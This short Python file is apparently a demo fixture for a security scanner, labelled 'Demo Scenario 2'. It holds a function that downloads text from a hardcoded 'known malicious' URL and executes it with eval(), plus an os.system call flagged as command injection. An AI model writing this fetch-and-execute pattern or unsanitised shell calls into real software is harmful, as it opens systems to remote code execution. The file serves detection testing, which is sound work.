import requests
import os

# Demo Scenario 2: Suspicious domains and dangerous functions

def download_payload():
    print("Downloading payload from external source...")
    # This domain is hardcoded in the Go mock as a known malicious URL
    url = "http://malware.eicar.org/test"
    
    response = requests.get(url)
    
    # Dangerous evaluation of remote code
    eval(response.text)

def run_command():
    # Potential command injection
    user_input = "ls -la"
    os.system(user_input)
